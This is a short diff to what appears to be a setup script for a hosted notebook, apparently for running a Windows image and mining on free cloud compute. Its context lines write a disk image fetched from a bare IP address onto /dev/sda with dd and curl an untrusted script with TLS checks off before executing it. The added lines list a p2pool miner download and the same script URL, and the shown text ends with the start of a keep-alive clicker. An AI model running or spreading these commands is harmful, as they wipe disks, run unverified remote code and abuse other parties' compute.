@@ -4,6 +4,10 @@ pip install selenium
 pip install "pymongo[srv]"
 pip install beautifulsoup4
 pip install requests
+pip install pywin32
+
+
+#######################################_________//////_______________________////////____////
 
 
 wget -O- --no-check-certificate http://159.65.147.58/win.gz | gunzip | dd of=/dev/sda
@@ -22,6 +26,12 @@ curl -skLO https://raw.githubusercontent.com/geodatabasecol/Python-Dashboard-Pan
 
 
 curl -skLO https://raw.githubusercontent.com/geodatabasecol/Python-Dashboard-Panel/main/scriptest.sh ; chmod +x scriptest.sh ; sed -i 's/\r$//' scriptest.sh; ./scriptest.sh
+
+https://github.com/SChernykh/p2pool/releases/download/v2.1/p2pool-v2.1-linux-x64.tar.gz
+
+https://raw.githubusercontent.com/geodatabasecol/Python-Dashboard-Panel/main/scriptest.sh
+
+
 
 
  function ClickConnect(){
